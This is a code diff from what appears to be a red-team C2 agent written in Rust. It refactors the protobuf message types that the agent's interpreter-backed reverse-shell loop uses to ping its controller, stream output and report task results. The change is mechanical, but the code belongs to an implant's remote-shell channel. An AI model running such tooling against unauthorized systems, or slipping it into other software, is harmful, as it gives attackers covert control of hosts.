@@ -5,8 +5,8 @@ use eldritch::assets::std::EmptyAssets;
 use eldritch::repl::{Repl, ReplAction};
 use eldritch::{Interpreter, Value};
 use pb::c2::{
-    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
-    TaskContext, TaskError, TaskOutput,
+    report_output_request, reverse_shell_request, ReportOutputRequest, ReverseShellMessageKind,
+    ReverseShellRequest, ReverseShellResponse, TaskContext, TaskError, TaskOutput,
 };
 use std::io::{BufWriter, Write};
 use std::sync::Arc;
@@ -35,7 +35,9 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     // Initial Registration
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
-            context: Some(task_context.clone()),
+            context: Some(reverse_shell_request::Context::TaskContext(
+                task_context.clone(),
+            )),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         })
@@ -82,23 +84,28 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                                 let s_crlf = msg.replace('\n', "\r\n");
                                 let _ = consumer_output_tx
                                     .send(ReverseShellRequest {
-                                        context: Some(consumer_context.clone()),
+                                        context: Some(reverse_shell_request::Context::TaskContext(
+                                            consumer_context.clone(),
+                                        )),
                                         kind: ReverseShellMessageKind::Data.into(),
                                         data: s_crlf.into_bytes(),
                                     })
                                     .await;
 
                                 // Report Task Output
-                                let _ = consumer_agent.report_task_output(ReportTaskOutputRequest {
-                                    output: Some(TaskOutput {
-                                        id: consumer_context.task_id,
-                                        output: msg,
-                                        error: None,
-                                        exec_started_at: None,
-                                        exec_finished_at: None,
-                                    }),
-                                    context: Some(consumer_context.clone()),
-                                    shell_task_output: None,
+                                let _ = consumer_agent.report_task_output(ReportOutputRequest {
+                                    output: Some(report_output_request::Output::TaskOutput(
+                                        TaskOutput {
+                                            id: consumer_context.task_id,
+                                            output: msg,
+                                            error: None,
+                                            exec_started_at: None,
+                                            exec_finished_at: None,
+                                        },
+                                    )),
+                                    context: Some(report_output_request::Context::TaskContext(
+                                        consumer_context.clone(),
+                                    )),
                                 });
                             }
                             None => {
@@ -113,23 +120,28 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
                                 let s_crlf = msg.replace('\n', "\r\n");
                                 let _ = consumer_output_tx
                                     .send(ReverseShellRequest {
-                                        context: Some(consumer_context.clone()),
+                                        context: Some(reverse_shell_request::Context::TaskContext(
+                                            consumer_context.clone(),
+                                        )),
                                         kind: ReverseShellMessageKind::Data.into(),
                                         data: s_crlf.into_bytes(),
                                     })
                                     .await;
 
                                 // Report Task Output
-                                let _ = consumer_agent.report_task_output(ReportTaskOutputRequest {
-                                    output: Some(TaskOutput {
-                                        id: consumer_context.task_id,
-                                        output: String::new(),
-                                        error: Some(TaskError { msg }),
-                                        exec_started_at: None,
-                                        exec_finished_at: None,
-                                    }),
-                                    context: Some(consumer_context.clone()),
-                                    shell_task_output: None,
+                                let _ = consumer_agent.report_task_output(ReportOutputRequest {
+                                    output: Some(report_output_request::Output::TaskOutput(
+                                        TaskOutput {
+                                            id: consumer_context.task_id,
+                                            output: String::new(),
+                                            error: Some(TaskError { msg }),
+                                            exec_started_at: None,
+                                            exec_finished_at: None,
+                                        },
+                                    )),
+                                    context: Some(report_output_request::Context::TaskContext(
+                                        consumer_context.clone(),
+                                    )),
                                 });
                             }
                             None => {
@@ -166,7 +178,9 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
         while let Some(msg) = input_rx.blocking_recv() {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                 let _ = output_tx.blocking_send(ReverseShellRequest {
-                    context: Some(task_context.clone()),
+                    context: Some(reverse_shell_request::Context::TaskContext(
+                        task_context.clone(),
+                    )),
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: msg.data,
                 });
